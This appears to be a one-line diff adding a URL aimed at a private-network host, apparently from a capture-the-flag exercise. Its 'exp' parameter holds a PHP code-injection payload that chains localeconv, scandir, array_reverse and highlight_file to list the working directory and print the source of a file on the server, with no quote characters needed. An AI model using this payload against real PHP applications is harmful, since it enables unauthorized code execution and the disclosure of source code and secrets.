@@ -1,0 +1,1 @@
+http://172.21.4.12:10031/?exp=print_r(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));
